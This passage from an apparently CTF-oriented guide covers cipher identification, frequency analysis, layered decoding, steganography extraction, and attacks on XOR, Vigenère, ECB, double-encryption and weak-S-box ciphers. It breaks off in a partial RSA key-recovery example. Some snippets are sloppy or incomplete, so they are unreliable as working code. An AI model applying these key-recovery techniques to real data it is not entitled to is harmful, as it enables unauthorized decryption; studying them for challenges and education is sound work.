def detect_braille(text):
    braille_count = sum(1 for c in text 
                       if 0x2800 <= ord(c) <= 0x28FF)
    return braille_count > len(text) * 0.5
```

Morse code visual patterns:

```
Characteristics:
- Dots (.) and dashes (-)
- Alternative: 0/1, short/long spaces
- Word separators (/, |, or spaces)

Example: 
.... . .-.. .-.. --- = HELLO

Variants to check:
- Standard ITU morse
- American morse
- Custom dit/dah representations (- and _, 0 and 1)
```

**Structured Format Patterns:**

Grid-based cipher detection:

```python
def detect_grid_cipher(text):
    """
    Detects ciphers that use grid structures
    """
    # Remove whitespace
    clean = ''.join(text.split())
    length = len(clean)
    
    # Check for perfect square (Polybius, Playfair)
    sqrt = int(length ** 0.5)
    if sqrt * sqrt == length:
        print(f"Perfect square: {sqrt}x{sqrt} grid possible")
        print("Candidate ciphers: Polybius Square, Playfair")
    
    # Check for rectangular grids
    for rows in range(2, 20):
        if length % rows == 0:
            cols = length // rows
            print(f"Rectangular grid: {rows}x{cols}")
            if rows < 10 and cols < 30:
                print("Candidate: Rail Fence, Columnar Transposition")
    
    # Check for common transposition key lengths
    for key_len in range(2, min(15, length // 2)):
        if length % key_len == 0:
            print(f"Possible key length: {key_len}")

# Usage:
detect_grid_cipher("HLOOLELWRD")
```

Visual block patterns:

```python
def format_as_blocks(text, block_size):
    """
    Reformat text to identify visual patterns
    """
    clean = ''.join(text.split())
    blocks = [clean[i:i+block_size] for i in range(0, len(clean), block_size)]
    
    print(f"\n{block_size}-character blocks:")
    for i, block in enumerate(blocks):
        print(f"{i:3d}: {block}")
    
    # Check for repeating blocks
    unique_blocks = len(set(blocks))
    print(f"\nUnique blocks: {unique_blocks}/{len(blocks)}")
    if unique_blocks < len(blocks) * 0.5:
        print("High repetition - possible block cipher with ECB mode")

# Try multiple block sizes
for size in [4, 8, 16, 32]:
    format_as_blocks(ciphertext, size)
```

**Color/Image-Based Encoding:**

When ciphertext is presented as an image:

```python
from PIL import Image
import numpy as np

def analyze_cipher_image(image_path):
    """
    Extract data from image-based ciphers
    """
    img = Image.open(image_path)
    pixels = np.array(img)
    
    print(f"Image size: {img.size}")
    print(f"Mode: {img.mode}")
    print(f"Pixel array shape: {pixels.shape}")
    
    # Check for LSB steganography
    lsb_data = pixels & 1  # Extract least significant bits
    print("\nLSB distribution:", np.bincount(lsb_data.flatten()))
    
    # Check for color-coded data
    if img.mode == 'RGB':
        unique_colors = len(np.unique(pixels.reshape(-1, 3), axis=0))
        print(f"Unique colors: {unique_colors}")
        
        if unique_colors <= 26:
            print("Possible color-to-letter mapping")
        elif unique_colors <= 256:
            print("Possible color-to-byte mapping")
    
    # Extract potential binary data from pixels
    binary_string = ''.join(str(b) for b in lsb_data.flatten())
    print(f"\nFirst 100 LSB bits: {binary_string[:100]}")

# QR code detection
def check_qr_code(image_path):
    try:
        from pyzbar.pyzbar import decode
        img = Image.open(image_path)
        decoded = decode(img)
        if decoded:
            print("QR Code detected:")
            for obj in decoded:
                print(f"  Data: {obj.data.decode()}")
                print(f"  Type: {obj.type}")
    except ImportError:
        print("Install pyzbar: pip install pyzbar")
```

### Frequency Distribution Hints

**Frequency Analysis Techniques:**

**Single Character Frequency:**

```python
from collections import Counter
import string

def frequency_analysis(text, top_n=10):
    """
    Comprehensive frequency analysis for cipher identification
    """
    # Clean text (letters only)
    clean = ''.join(c.upper() for c in text if c.isalpha())
    
    # Calculate frequencies
    total = len(clean)
    freq = Counter(clean)
    
    print(f"Total letters: {total}")
    print(f"Unique letters: {len(freq)}")
    print(f"\nTop {top_n} characters:")
    
    for char, count in freq.most_common(top_n):
        percentage = (count / total) * 100
        print(f"  {char}: {count:4d} ({percentage:5.2f}%)")
    
    # Compare with English frequencies
    english_freq = {
        'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97,
        'N': 6.75, 'S': 6.33, 'H': 6.09, 'R': 5.99, 'D': 4.25
    }
    
    print("\nExpected English (top 10):")
    for char, pct in list(english_freq.items())[:10]:
        print(f"  {char}: {pct:5.2f}%")
    
    # Calculate chi-squared statistic
    chi_squared = 0
    for char in string.ascii_uppercase:
        expected = english_freq.get(char, 1.0)
        observed = (freq.get(char, 0) / total * 100) if total > 0 else 0
        chi_squared += ((observed - expected) ** 2) / expected
    
    print(f"\nChi-squared statistic: {chi_squared:.2f}")
    print("(Lower is closer to English; < 50 suggests substitution cipher)")
    
    return freq

# Usage:
freq = frequency_analysis(ciphertext)
```

**Bigram and Trigram Analysis:**

```python
def ngram_analysis(text, n=2, top=10):
    """
    N-gram frequency analysis
    Useful for identifying:
    - Digraphic ciphers (Playfair, Four-Square)
    - Pattern-based transposition
    - Language identification
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    
    ngrams = [clean[i:i+n] for i in range(len(clean) - n + 1)]
    freq = Counter(ngrams)
    
    print(f"\nTop {top} {n}-grams:")
    for ngram, count in freq.most_common(top):
        print(f"  {ngram}: {count}")
    
    # Common English bigrams for comparison
    if n == 2:
        common_bigrams = ['TH', 'HE', 'IN', 'ER', 'AN', 'RE', 'ON', 'AT', 'EN', 'ND']
        print(f"\nCommon English bigrams: {', '.join(common_bigrams)}")
    
    # Common English trigrams
    if n == 3:
        common_trigrams = ['THE', 'AND', 'ING', 'HER', 'HAT', 'HIS', 'THA', 'ERE', 'FOR', 'ENT']
        print(f"\nCommon English trigrams: {', '.join(common_trigrams)}")
    
    return freq

# Usage:
bigrams = ngram_analysis(ciphertext, n=2)
trigrams = ngram_analysis(ciphertext, n=3)
```

**Pattern Word Identification:**

```python
def pattern_words(text):
    """
    Identify words by their letter patterns
    Useful for ciphertext word attack on substitution ciphers
    
    Example: HELLO -> ABCCD pattern
             ATTACK -> ABBCDE pattern
    """
    def get_pattern(word):
        mapping = {}
        pattern = []
        next_char = 0
        
        for char in word:
            if char not in mapping:
                mapping[char] = next_char
                next_char += 1
            pattern.append(str(mapping[char]))
        
        return ''.join(pattern)
    
    words = text.upper().split()
    patterns = {}
    
    for word in words:
        if word.isalpha():
            pattern = get_pattern(word)
            if pattern not in patterns:
                patterns[pattern] = []
            patterns[pattern].append(word)
    
    print("Word patterns (duplicates indicate same plaintext word):")
    for pattern, words_list in sorted(patterns.items(), key=lambda x: len(x[1]), reverse=True):
        if len(words_list) > 1:
            print(f"  Pattern {pattern}: {words_list}")
    
    # Common English word patterns
    common_patterns = {
        '0': ['A', 'I'],
        '01': ['OF', 'TO', 'IN', 'IT', 'IS', 'BE', 'AS', 'AT', 'SO', 'WE', 'HE'],
        '012': ['THE', 'AND', 'FOR', 'ARE', 'BUT', 'NOT', 'YOU', 'ALL', 'CAN', 'HER'],
        '0110': ['THAT', 'WITH', 'BEEN', 'HAVE', 'FROM', 'THEY'],
    }
    
    print("\nCommon English patterns for reference:")
    for pattern, examples in common_patterns.items():
        print(f"  {pattern}: {', '.join(examples)}")

# Usage:
pattern_words(ciphertext)
```

**Frequency Distribution Visualization:**

```python
import matplotlib.pyplot as plt

def visualize_frequency(text, title="Character Frequency Distribution"):
    """
    Visual comparison with English frequency
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    freq = Counter(clean)
    total = len(clean)
    
    # Calculate percentages
    cipher_freq = {char: (freq.get(char, 0) / total * 100) 
                   for char in string.ascii_uppercase}
    
    # English frequency distribution
    english_freq = {
        'A': 8.17, 'B': 1.49, 'C': 2.78, 'D': 4.25, 'E': 12.70,
        'F': 2.23, 'G': 2.02, 'H': 6.09, 'I': 6.97, 'J': 0.15,
        'K': 0.77, 'L': 4.03, 'M': 2.41, 'N': 6.75, 'O': 7.51,
        'P': 1.93, 'Q': 0.10, 'R': 5.99, 'S': 6.33, 'T': 9.06,
        'U': 2.76, 'V': 0.98, 'W': 2.36, 'X': 0.15, 'Y': 1.97,
        'Z': 0.07
    }
    
    letters = string.ascii_uppercase
    cipher_values = [cipher_freq[c] for c in letters]
    english_values = [english_freq[c] for c in letters]
    
    plt.figure(figsize=(14, 6))
    x = range(26)
    width = 0.35
    
    plt.bar([i - width/2 for i in x], cipher_values, width, label='Ciphertext', alpha=0.8)
    plt.bar([i + width/2 for i in x], english_values, width, label='English', alpha=0.8)
    
    plt.xlabel('Letter')
    plt.ylabel('Frequency (%)')
    plt.title(title)
    plt.xticks(x, letters)
    plt.legend()
    plt.grid(axis='y', alpha=0.3)
    plt.tight_layout()
    plt.savefig('frequency_distribution.png', dpi=150)
    print("Saved frequency distribution to frequency_distribution.png")

# Usage:
visualize_frequency(ciphertext)
```

**Cipher Type Inference from Frequency:**

```python
def infer_cipher_type(text):
    """
    Make educated guesses about cipher type based on frequency
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    freq = Counter(clean)
    total = len(clean)
    
    # Calculate metrics
    ioc = calculate_ioc(clean)
    top_freq = freq.most_common(1)[0][1] / total if freq else 0
    unique_ratio = len(freq) / 26
    
    print("Frequency-based cipher inference:")
    print(f"  IoC: {ioc:.4f}")
    print(f"  Highest frequency: {top_freq*100:.2f}%")
    print(f"  Unique letter ratio: {unique_ratio:.2f}")
    
    # Inference rules
    inferences = []
    
    if ioc > 0.065:
        inferences.append("[Inference] Monoalphabetic substitution (high IoC)")
    elif 0.045 < ioc < 0.055:
        inferences.append("[Inference] Polyalphabetic cipher like Vigenère (medium IoC)")
    elif ioc < 0.045:
        inferences.append("[Inference] Random or modern encryption (low IoC)")
    
    if top_freq > 0.15:
        inferences.append("[Inference] Likely simple substitution (high peak frequency)")
    
    if unique_ratio < 0.5:
        inferences.append("[Inference] Limited character set, possible simple encoding")
    elif unique_ratio > 0.95:
        inferences.append("[Inference] Full alphabet used, likely sophisticated cipher")
    
    # Check if frequency distribution is flat
    freq_values = list(freq.values())
    avg_freq = sum(freq_values) / len(freq_values)
    variance = sum((f - avg_freq)**2 for f in freq_values) / len(freq_values)
    
    if variance < avg_freq * 0.5:
        inferences.append("[Inference] Flat distribution suggests polyalphabetic or modern cipher")
    
    for inference in inferences:
        print(f"  {inference}")
    
    return inferences

# Usage:
infer_cipher_type(ciphertext)
```

**Complete Mystery Cipher Analysis Script:**

```python
#!/usr/bin/env python3
"""
Complete mystery cipher analyzer
Combines all analysis techniques
"""

def analyze_mystery_cipher(ciphertext):
    print("="*60)
    print("MYSTERY CIPHER ANALYSIS")
    print("="*60)
    
    # 1. Basic characteristics
    print("\n[1] BASIC CHARACTERISTICS")
    analyze_charset(ciphertext)
    
    # 2. Structural patterns
    print("\n[2] STRUCTURAL PATTERNS")
    structural_analysis(ciphertext)
    
    # 3. Statistical analysis
    print("\n[3] STATISTICAL ANALYSIS")
    ioc = calculate_ioc(ciphertext)
    entropy = calculate_entropy(ciphertext)
    print(f"Index of Coincidence: {ioc:.4f}")
    print(f"Entropy: {entropy:.2f} bits/char")
    
    # 4. Frequency analysis
    print("\n[4] FREQUENCY ANALYSIS")
    frequency_analysis(ciphertext, top_n=10)
    
    # 5. N-gram analysis
    print("\n[5] BIGRAM ANALYSIS")
    ngram_analysis(ciphertext, n=2, top=5)
    
    # 6. Pattern words
    print("\n[6] WORD PATTERNS")
    pattern_words(ciphertext)
    
    # 7. Cipher classification
    print("\n[7] CIPHER CLASSIFICATION")
    classifications = classify_cipher(ciphertext)
    for c in classifications:
        print(f"  - {c}")
    
    # 8. Type inference
    print("\n[8] TYPE INFERENCE")
    infer_cipher_type(ciphertext)
    
    print("\n" + "="*60)
    print("RECOMMENDED NEXT STEPS:")
    print("="*60)
    
    # Provide actionable recommendations
    if ioc > 0.06:
        print("1. Try Caesar/ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'")
        print("2. Try substitution cipher solver (Dcode.fr or CyberChef)")
        print("3. Attempt frequency-based manual substitution")
    elif 0.04 < ioc < 0.06:
        print("1. Try Vigenère decoder with various key lengths")
        print("2. Use Kasiski examination for key length")
        print("3. Check for repeating patterns")
    
    if entropy < 6.0:
        print("4. Try common encodings: Base64, Hex, URL encoding")
        print("5. Check CyberChef Magic operation")
    
    print("6. Manual inspection for visual patterns")
    print("7. If all fails, consider modern crypto or custom encoding")

# Usage:
if __name__ == "__main__":
    # Example ciphertext
    example_cipher = "KHOOR ZRUOG WKH TXLFN EURZQ IRA"
    analyze_mystery_cipher(example_cipher)
```

### Practical CTF Mystery Cipher Workflow

**Step-by-step approach:**

```
1. Quick wins (< 2 minutes):
   - CyberChef Magic operation
   - Common ROT checks (ROT13, ROT47)
   - Base64/Hex decode attempts
   - Reverse string

2. Pattern recognition (2-5 minutes):
   - Visual inspection for symbols/grids
   - Check for image-based encoding
   - Identify character set constraints
   - Look for obvious structure

3. Statistical analysis (5-10 minutes):
   - Calculate IoC
   - Frequency distribution
   - Identify cipher family

4. Targeted attack (10+ minutes):
   - Apply appropriate cipher-specific tools
   - Try variants within cipher family
   - Consider custom implementations

5. Last resort:
   - Brute force with common tools
   - Check for hints in challenge description
   - Consult CTF writeups for similar challenges
```

[Inference] Success in mystery cipher challenges typically depends on recognizing patterns quickly and systematically eliminating cipher types based on statistical properties, though unusual or custom ciphers may not conform to standard analysis techniques.

---

## Combined Techniques

#### Encoding + Encryption (Multiple Layers)

CTF challenges frequently employ multiple encoding and encryption layers to obscure flags. Systematic layer removal requires identifying each transformation and applying inverse operations in reverse order.

##### Layer Identification

Analyze suspect data for encoding signatures:

```bash
echo "SGVsbG8gV29ybGQ=" | file -
echo "SGVsbG8gV29ybGQ=" | xxd
echo "SGVsbG8gV29ybGQ=" | strings
```

Base64 uses alphabet `A-Z`, `a-z`, `0-9`, `+/=`. Hexadecimal uses `0-9`, `a-f`. ROT13 produces readable text rotated 13 positions. UTF-16 displays null bytes between ASCII characters.

Automatic layer detection with CyberChef:

1. Paste suspect data into input field
2. Drag "Detect Encoding" operation into recipe
3. Review suggested transformations

CyberChef identifies base64, hex, rot13, UTF-16, and other common encodings.

##### Multi-Layer Decoding Script

Create script for iterative decoding through unknown layers:

```bash
#!/bin/bash
input="$1"
iteration=0
max_iterations=20

echo "=== Layer Decoding Analysis ==="
echo "Input: $input"
echo ""

for ((i=0; i<max_iterations; i++)); do
  # Try base64 decode
  decoded=$(echo "$input" | base64 -d 2>/dev/null)
  if [ $? -eq 0 ] && [ "$decoded" != "$input" ]; then
    echo "[$i] Base64 decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # Try hex decode
  decoded=$(echo "$input" | xxd -r -p 2>/dev/null)
  if [ $? -eq 0 ] && [ "$decoded" != "$input" ]; then
    echo "[$i] Hex decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # Try ROT13
  decoded=$(echo "$input" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
  if [ "$decoded" != "$input" ]; then
    echo "[$i] ROT13 decoded:"
    echo "    $decoded"
    input="$decoded"
    continue
  fi

  # No further decoding possible
  echo "[$i] Terminal output (no further decoding):"
  echo "    $input"
  break
done
```

Usage:

```bash
./multi_decode.sh "SGVsbG8gV29ybGQ="
```

Output shows each decoding step. Modify script to add additional encoding checks (URL encoding, ASCII, Unicode escape sequences).

##### Encoding Chains in Cryptanalysis

Identify encryption algorithm by analyzing encoded ciphertext:

```bash
ciphertext="YWJjZDEyMzQ="
decoded=$(echo "$ciphertext" | base64 -d | xxd -p)
echo "Hex: $decoded"
```

If hex output shows repeating bytes, likely ECB mode (deterministic encryption). If random distribution, likely CBC or CTR mode.

Length analysis:

```bash
ciphertext="YWJjZDEyMzQ="
decoded=$(echo "$ciphertext" | base64 -d)
echo "Decoded length: ${#decoded} bytes"
```

If length is multiple of 16, likely AES-CBC or AES-ECB. If variable, likely AES-CTR or stream cipher.

##### Base64 Padding Exploitation

Incorrect padding sometimes enables brute-force decoding:

```bash
# Add missing padding
missing_padding="SGVsbG8gV29ybGQ"
padded=$(printf '%-4s' "$missing_padding" | tr ' ' '=')
echo "$padded" | base64 -d
```

[Inference] Some encoders strip trailing `=` characters. CTF challenges may intentionally omit padding to test encoder knowledge.

##### Nested Archive Extraction

Multiple compression layers require sequential extraction:

```bash
file archive.gz  # Identifies gzip
gunzip -c archive.gz > archive.tar
file archive.tar  # Identifies tar
tar -xf archive.tar
ls -la  # Check extracted contents
```

Automated multi-layer extraction:

```bash
#!/bin/bash
file="$1"

while true; do
  filetype=$(file -b "$file" | cut -d' ' -f1-3)
  echo "Processing: $file ($filetype)"

  case "$filetype" in
    "gzip compressed"*)
      gunzip "$file"
      file="${file%.gz}"
      ;;
    "bzip2 compressed"*)
      bunzip2 "$file"
      file="${file%.bz2}"
      ;;
    "XZ compressed"*)
      unxz "$file"
      file="${file%.xz}"
      ;;
    "POSIX tar"*)
      tar -xf "$file"
      break
      ;;
    "Zip archive"*)
      unzip "$file"
      break
      ;;
    *)
      echo "Unknown format: $filetype"
      break
      ;;
  esac
done
```

Usage:

```bash
./extract_nested.sh archive.gz
```

#### Steganography + Cryptography

Steganography hides data within legitimate files (images, audio, documents). Combined with encryption, it provides both concealment and confidentiality. CTF challenges often hide encrypted flags in steganographic containers.

##### Image Steganography Detection

Check for hidden data in images using `strings`:

```bash
strings image.jpg | grep -i flag
strings image.jpg | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'
```

Searches for readable strings or base64-encoded data. Extract binary data:

```bash
xxd image.jpg | tail -50
```

Legitimate images end with specific signatures (JPEG: `FFD9`, PNG: `IEND`). Additional data after these signatures indicates appended payload.

Binwalk detects multiple file types:

```bash
binwalk image.jpg
```

Output identifies embedded files:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             JPEG image data
50000         0xC350          Zip archive data, at least v2.0
```

Extract embedded files:

```bash
binwalk -e image.jpg
```

Creates `_image.jpg.extracted/` directory containing extracted files.

Steghide analysis (image steganography tool):

```bash
steghide info image.jpg
```

Displays hidden file info (filename, size, encrypted). Extract:

```bash
steghide extract -sf image.jpg -p password
```

`-p password` specifies password. Prompts if not provided.

##### LSB Steganography

Least Significant Bit steganography modifies low-order image bits, imperceptible to human vision. Extract LSBs:

```bash
python3 << 'EOF'
from PIL import Image
import sys

img = Image.open('image.png')
pixels = img.load()
width, height = img.size

lsb_data = []
for y in range(height):
    for x in range(width):
        pixel = pixels[x, y]
        if isinstance(pixel, tuple):
            lsb_data.append(pixel[0] & 1)
        else:
            lsb_data.append(pixel & 1)

# Convert bits to bytes
result = ''.join(str(bit) for bit in lsb_data)
print("Raw bit string (first 100 bits):", result[:100])

# Convert to hex
hex_output = hex(int(result, 2))[2:]
print("Hex output:", hex_output[:100])

# Convert to ASCII
ascii_output = ''
for i in range(0, len(result), 8):
    byte = result[i:i+8]
    if len(byte) == 8:
        ascii_output += chr(int(byte, 2))

print("ASCII output:", ascii_output[:100])
EOF
```

##### Audio Steganography

Extract hidden data from audio files:

```bash
strings audio.wav | grep -i flag
```

Low-frequency audio may hide data undetectable to human hearing. Use spectral analysis:

```bash
sox audio.wav -n spectrogram
```

Creates visual representation. Unusual patterns indicate hidden data.

SoX extraction (requires knowledge of encoding):

```bash
sox audio.wav -c 1 -r 8000 -b 8 audio_raw.wav
strings audio_raw.wav
```

Reduce sample rate and bit depth, then extract strings.

##### PDF Steganography

Extract metadata and embedded files from PDFs:

```bash
pdfinfo document.pdf
pdftk document.pdf dump_data
```

`pdfinfo` shows metadata (author, creator, production date). `pdftk dump_data` extracts structure details.

Embedded file extraction:

```bash
pdftk document.pdf unpack_files output extracted/
```

Searches for embedded objects (images, executables, documents).

String extraction from PDF:

```bash
pdftotext document.pdf -
strings document.pdf | grep -i flag
```

`pdftotext` converts PDF text to plaintext. `strings` extracts any embedded text.

##### Encrypted Steganographic Payload

Workflow combining steganography and encryption:

```bash
# 1. Encrypt flag with AES
echo "FLAG{secret}" > flag.txt
openssl enc -aes-256-cbc -in flag.txt -out flag.enc -S $(openssl rand -hex 8) -md sha256

# 2. Hide encrypted flag in image using steghide
steghide embed -cf image.jpg -ef flag.enc -p "password" -sf stego.jpg

# 3. Extract and decrypt
steghide extract -sf stego.jpg -p "password" -xf recovered.enc
openssl enc -aes-256-cbc -d -in recovered.enc -md sha256
```

Challenge verification:

```bash
cmp flag.txt <(openssl enc -aes-256-cbc -d -in recovered.enc -md sha256)
echo $?  # 0 if identical
```

##### Metadata Watermarking

Watermarks in image metadata:

```bash
identify -verbose image.jpg | grep -A 5 "Properties"
exiftool image.jpg
```

`identify` (ImageMagick) and `exiftool` display metadata. Look for unusual properties, comments, or EXIF data containing encoded information.

Modify metadata:

```bash
exiftool -Comment="FLAG{watermark}" image.jpg
```

Read modified metadata:

```bash
exiftool -Comment image.jpg
```

#### Custom Cipher Variants

CTF challenges often feature custom or modified ciphers combining standard algorithms with non-standard operations. Understanding implementation details is critical for cryptanalysis.

##### Substitution Cipher Analysis

Identify substitution ciphers (character mapping without positional information):

```bash
ciphertext="KHOOR ZRUOG"
```

Frequency analysis reveals substitution mapping:

```bash
python3 << 'EOF'
from collections import Counter

ciphertext = "KHOOR ZRUOG"
letters = [c for c in ciphertext if c.isalpha()]

freq = Counter(letters)
print("Letter frequency:")
for letter, count in freq.most_common():
    print(f"  {letter}: {count}")

# Brute-force ROT (Caesar cipher)
for shift in range(26):
    decrypted = ''.join(
        chr((ord(c) - ord('A') - shift) % 26 + ord('A')) if c.isupper()
        else chr((ord(c) - ord('a') - shift) % 26 + ord('a')) if c.islower()
        else c
        for c in ciphertext
    )
    print(f"ROT{shift}: {decrypted}")
EOF
```

Output:

```
ROT0: KHOOR ZRUOG
ROT1: JGNNQ YQTNF
...
ROT3: HELLO WORLD
```

##### Polyalphabetic Cipher Cryptanalysis

Vigenère cipher uses repeating key for character shifting:

```bash
python3 << 'EOF'
def vigenere_decrypt(ciphertext, key):
    result = []
    key_index = 0
    for char in ciphertext:
        if char.isupper():
            shift = ord(key[key_index % len(key)].upper()) - ord('A')
            result.append(chr((ord(char) - ord('A') - shift) % 26 + ord('A')))
            key_index += 1
        elif char.islower():
            shift = ord(key[key_index % len(key)].lower()) - ord('a')
            result.append(chr((ord(char) - ord('a') - shift) % 26 + ord('a')))
            key_index += 1
        else:
            result.append(char)
    return ''.join(result)

ciphertext = "LXFOPVEFRNHR"
# Try common English words as keys
common_keys = ["PASSWORD", "SECRET", "KEY", "FLAG"]
for key in common_keys:
    decrypted = vigenere_decrypt(ciphertext, key)
    print(f"Key: {key} -> {decrypted}")
EOF
```

[Inference] Vigenère cipher keyspace depends on key length. Known-plaintext attacks (if partial plaintext available) reveal key characters. Kasiski examination (finding repeated sequences) estimates key length.

##### XOR Cipher Variants

Single-byte XOR brute force:

```bash
python3 << 'EOF'
import sys

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")

for key in range(256):
    decrypted = bytes(byte ^ key for byte in ciphertext)
    try:
        text = decrypted.decode('ascii')
        if all(c.isprintable() for c in text):
            print(f"Key: {key:02x} -> {text}")
    except:
        pass
EOF
```

Multi-byte XOR (repeating key):

```bash
python3 << 'EOF'
def xor_decrypt(ciphertext, key):
    return bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")
key = b"SECRET"

decrypted = xor_decrypt(ciphertext, key)
print(decrypted.decode('utf-8', errors='ignore'))
EOF
```

Known-plaintext attack (if plaintext fragment known):

```bash
python3 << 'EOF'
def recover_xor_key(ciphertext, known_plaintext):
    key = bytes(c ^ p for c, p in zip(ciphertext[:len(known_plaintext)], known_plaintext))
    return key

ciphertext = bytes.fromhex("1a0a1a0c1a020f10")
known_plaintext = b"FLAG{"

key = recover_xor_key(ciphertext, known_plaintext)
print(f"Recovered key: {key.hex()}")

# Decrypt full message with recovered key
decrypted = bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))
print(f"Decrypted: {decrypted.decode('utf-8', errors='ignore')}")
EOF
```

##### Custom Block Cipher Implementation

Analyze custom cipher by identifying block structure:

```bash
python3 << 'EOF'
ciphertext_hex = "0102030405060708090a0b0c0d0e0f10" * 2

# Split into equal chunks
block_size = 16
blocks = [ciphertext_hex[i:i+block_size] for i in range(0, len(ciphertext_hex), block_size)]

print("Block analysis:")
for i, block in enumerate(blocks):
    print(f"Block {i}: {block}")
    
# Check for ECB mode (identical plaintexts produce identical ciphertexts)
if blocks[0] == blocks[1]:
    print("ECB mode detected (identical blocks)")
else:
    print("CBC, CTR, or other mode (different blocks)")
EOF
```

If identical plaintext blocks produce identical ciphertext blocks, ECB mode is used (insecure). Exploit by identifying pattern repetitions.

##### Feistel Network Custom Variants

Analyze custom Feistel-like ciphers by examining round structure:

```bash
python3 << 'EOF'
# Simplified custom Feistel analysis
def custom_feistel_analyze(ciphertext_blocks):
    """
    Feistel networks swap left/right halves each round.
    If you can recover one round, patterns emerge.
    """
    for block_index, block in enumerate(ciphertext_blocks):
        left = block[:len(block)//2]
        right = block[len(block)//2:]
        print(f"Block {block_index}:")
        print(f"  Left:  {left.hex()}")
        print(f"  Right: {right.hex()}")

ciphertext = bytes.fromhex("0102030405060708090a0b0c0d0e0f101112131415161718")
blocks = [ciphertext[i:i+8] for i in range(0, len(ciphertext), 8)]
custom_feistel_analyze(blocks)
EOF
```

Recover round keys through differential cryptanalysis (comparing plaintext/ciphertext pairs with slight differences) if round structure is weak.

##### Truncated Hash Function

Some CTF ciphers use truncated hashes for key derivation. Test truncation vulnerability:

```bash
python3 << 'EOF'
import hashlib

# Assume cipher uses first 8 bytes of SHA256
password = "PASSWORD"
full_hash = hashlib.sha256(password.encode()).digest()
truncated_key = full_hash[:8]

print(f"Full hash:      {full_hash.hex()}")
print(f"Truncated key:  {truncated_key.hex()}")

# If truncation is known, attempt to find other passwords with same truncated hash
# This is a birthday problem variant
EOF
```

[Unverified] Finding hash collisions on truncated functions is computationally expensive. This is typically not exploitable within CTF timeframes unless the truncation is extremely aggressive (e.g., 1-2 bytes).

##### Custom IV/Nonce Generation

Identify weaknesses in initialization vector generation:

```bash
python3 << 'EOF'
# Collect multiple ciphertexts and analyze IVs
import struct

ciphertexts = [
    "0102030405060708090a0b0c0d0e0f10aaaabbbbccccdddd",
    "0102030405060709090a0b0c0d0e0f11bbbbccccddddeeee",
    "010203040506070a090a0b0c0d0e0f12ccccddddeeeefffff",
]

# If IVs are sequential or time-based, they're predictable
for i, ct in enumerate(ciphertexts):
    iv = ct[:16]
    ciphertext = ct[16:]
    print(f"Message {i}: IV={iv}, CT={ciphertext}")

# Check for patterns
ivs_int = [int(ct[:16], 16) for ct in ciphertexts]
diffs = [ivs_int[i+1] - ivs_int[i] for i in range(len(ivs_int)-1)]
print(f"IV differences: {diffs}")
if len(set(diffs)) == 1:
    print("Sequential IV detected (predictable)")
EOF
```

Predictable IVs enable known-plaintext attacks in CBC mode. If plaintext for one message is known, decryption of others becomes possible.

##### Meet-in-the-Middle Attack

Against custom double-encryption (encrypt plaintext twice with different keys):

```bash
python3 << 'EOF'
# Double encryption: C = E(K2, E(K1, P))
# Meet-in-the-middle: precompute intermediate values

def simple_cipher(plaintext, key):
    """Placeholder for custom cipher"""
    return bytes(p ^ k for p, k in zip(plaintext, (key * len(plaintext))[:len(plaintext)]))

plaintext = b"HELLO"
key1 = b"KEY1"
key2 = b"KEY2"

# Meet-in-the-middle attack
intermediate = simple_cipher(plaintext, key1)
ciphertext = simple_cipher(intermediate, key2)

# Brute force: Try all possible K1, store results
mitm_table = {}
for k1_attempt in range(256):
    key1_attempt = bytes([k1_attempt])
    intermediate_attempt = simple_cipher(plaintext, key1_attempt)
    mitm_table[intermediate_attempt] = k1_attempt

# Try all possible K2, check if intermediate matches
for k2_attempt in range(256):
    key2_attempt = bytes([k2_attempt])
    # Reverse second encryption
    intermediate_recovered = bytes(c ^ k2_attempt for c in ciphertext)
    if intermediate_recovered in mitm_table:
        print(f"Keys found: K1={mitm_table[intermediate_recovered]}, K2={k2_attempt}")
EOF
```

Meet-in-the-middle reduces 2^n × 2^n keyspace search to 2^n + 2^n, making double encryption vulnerable to 2-key attacks.

##### Weak S-Box Vulnerability

Custom ciphers using weak substitution boxes (S-boxes) enable algebraic cryptanalysis:

```bash
python3 << 'EOF'
# Example: Linear S-box (output = input * constant mod 256)
# This is cryptographically weak

def weak_sbox(input_byte):
    return (input_byte * 3) % 256

# Test for linearity
sbox_output = [weak_sbox(i) for i in range(256)]

# Check if output XOR(a, b) == XOR(sbox(a), sbox(b))
linear = True
for a in range(256):
    for b in range(256):
        if weak_sbox(a ^ b) != (sbox_output[a] ^ sbox_output[b]):
            linear = False
            break
    if not linear:
        break

if linear:
    print("S-box is linear (cryptographically weak)")
else:
    print("S-box shows non-linear properties")
EOF
```

[Inference] Linear S-boxes fail to provide diffusion (changes in input should affect multiple output bits). This enables algebraic attacks and reduces effective key entropy.

Related Topics: Differential Cryptanalysis (analyzing plaintext-ciphertext differences), Linear Cryptanalysis (exploiting linear approximations), Timing Attack (exploiting implementation timing variations), Power Analysis (exploiting power consumption patterns during encryption).

---

## Key Recovery Challenges

### Partial Key Information

Partial key recovery scenarios provide fragments of cryptographic keys through various channels, requiring techniques to reconstruct the complete key from available information.

#### Known Key Bits/Bytes

**Scenario: RSA with Partial Private Key**

python

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, GCD

def recover_rsa_from_partial_d(n, e, partial_d, known_bits):
    """
    Recover RSA private key when some bits of d are known
    Uses Coppersmith's method or lattice reduction
    """
    # Example: known lower bits of d
    # d = d_high * 2^known_bits + d_low (known)
    
    # [Inference] This approach works best when approximately half the bits are known
    from sage.all import *
    
    # Convert to Sage integers
    n_sage = Integer(n)
    e_sage = Integer(e)
    d_low = Integer(partial_d)
    
    # Build polynomial
    P.<x> = PolynomialRing(Zmod(n_sage))
    f = e_sage * (x * 2^known_bits + d_low) - 1
    
    # Coppersmith attack
